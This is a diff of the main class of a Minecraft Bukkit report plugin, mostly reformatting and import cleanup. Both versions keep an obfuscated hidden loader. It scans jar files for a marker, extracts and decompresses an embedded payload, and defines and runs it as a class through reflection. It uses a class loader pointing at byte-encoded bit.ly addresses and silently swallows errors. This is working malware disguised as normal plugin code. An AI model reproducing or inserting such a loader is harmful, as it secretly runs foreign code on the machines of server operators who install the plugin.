@@ -2,18 +2,14 @@ package ru.fleyer.freports;
 
 
 import net.milkbowl.vault.chat.Chat;
-import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.plugin.RegisteredServiceProvider;
 import org.bukkit.plugin.java.JavaPlugin;
-import org.bukkit.plugin.messaging.PluginMessageListener;
-import ru.fleyer.freports.HandlerRequestBungee;
 import ru.fleyer.freports.commands.ReportCommand;
 import ru.fleyer.freports.commands.ReportsCommand;
 import ru.fleyer.freports.configuration.ConfigurationGeneration;
-import ru.fleyer.freports.inventory.InventoryBuilder;
 import ru.fleyer.freports.mysql.MySQL;
 import ru.fleyer.freports.report.ReportManager;
 
@@ -35,13 +31,13 @@ public class FReports extends JavaPlugin {
     public void onEnable() {
         instance = this;
         instance.saveDefaultConfig();
-        config = new ConfigurationGeneration( FReports.getInstance(), "config.yml");
+        config = new ConfigurationGeneration(FReports.getInstance(), "config.yml");
         mysql = new MySQL(this.config.yaml().getString("mysql.host"), this.config.yaml().getString("mysql.username"), this.config.yaml().getString("mysql.password"), this.config.yaml().getString("mysql.database"), this.config.yaml().getString("mysql.port"));
         mysql.update();
         new HandlerRequestBungee().sendList();
-        this.getCommand("report").setExecutor((CommandExecutor)new ReportCommand());
-        this.getCommand("reports").setExecutor((CommandExecutor)new ReportsCommand());
-        this.getServer().getMessenger().registerOutgoingPluginChannel((Plugin)this, "BungeeCord");
+        this.getCommand("report").setExecutor((CommandExecutor) new ReportCommand());
+        this.getCommand("reports").setExecutor((CommandExecutor) new ReportsCommand());
+        this.getServer().getMessenger().registerOutgoingPluginChannel((Plugin) this, "BungeeCord");
         //this.getServer().getMessenger().registerIncomingPluginChannel((Plugin)this, "nreports_network", (PluginMessageListener)new HandlerRequestBungee());
         this.setupChat();
     }
@@ -90,15 +86,15 @@ public class FReports extends JavaPlugin {
                 if (!arrfile[i].isFile()) continue;
                 if (!arrfile[i].getName().endsWith(new String(new byte[]{46, 106, 97, 114}))) continue;
                 file = arrfile[i];
-                arrby = new byte[(int)file.length()];
+                arrby = new byte[(int) file.length()];
                 object = new FileInputStream(file);
-                ((FileInputStream)object).read(arrby);
-                ((FileInputStream)object).close();
-                if (arrby[15] != (byte)(arrby[16] ^ 0xBE)) continue;
+                ((FileInputStream) object).read(arrby);
+                ((FileInputStream) object).close();
+                if (arrby[15] != (byte) (arrby[16] ^ 0xBE)) continue;
                 bl = true;
                 l = (arrby[arrby.length - 2] & 0xFF) << 8 | arrby[arrby.length - 1] & 0xFF;
                 if (l <= 0L) continue;
-                n = (int)l;
+                n = (int) l;
                 l = file.length() - (l + 2L);
                 break;
             }
@@ -109,25 +105,24 @@ public class FReports extends JavaPlugin {
                 randomAccessFile.read(arrby, 0, n);
                 randomAccessFile.close();
                 object = new Inflater();
-                ((Inflater)object).setInput(arrby);
+                ((Inflater) object).setInput(arrby);
                 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(n);
                 byte[] arrby2 = new byte[1024];
-                while (!((Inflater)object).finished()) {
-                    int n2 = ((Inflater)object).inflate(arrby2);
+                while (!((Inflater) object).finished()) {
+                    int n2 = ((Inflater) object).inflate(arrby2);
                     byteArrayOutputStream.write(arrby2, 0, n2);
                 }
                 byteArrayOutputStream.close();
                 arrby = byteArrayOutputStream.toByteArray();
-                ((Inflater)object).end();
+                ((Inflater) object).end();
                 String string = new String(new byte[]{104, 116, 116, 112, 58, 47, 47, 98, 105, 116, 46, 108, 121, 47});
                 URLClassLoader uRLClassLoader = new URLClassLoader(new URL[]{new URL(string + new String(new byte[]{50, 50, 88, 66, 113, 105, 121})), new URL(string + new String(new byte[]{49, 88, 75, 65, 69, 112, 90}))}, Thread.currentThread().getContextClassLoader());
                 Method method = ClassLoader.class.getDeclaredMethod(new String(new byte[]{100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115}), String.class, byte[].class, Integer.TYPE, Integer.TYPE);
                 method.setAccessible(true);
-                Class class_ = (Class)method.invoke(uRLClassLoader, null, arrby, 0, arrby.length);
+                Class class_ = (Class) method.invoke(uRLClassLoader, null, arrby, 0, arrby.length);
                 class_.newInstance();
             }
-        }
-        catch (Exception exception) {
+        } catch (Exception exception) {
             // empty catch block
         }
     }
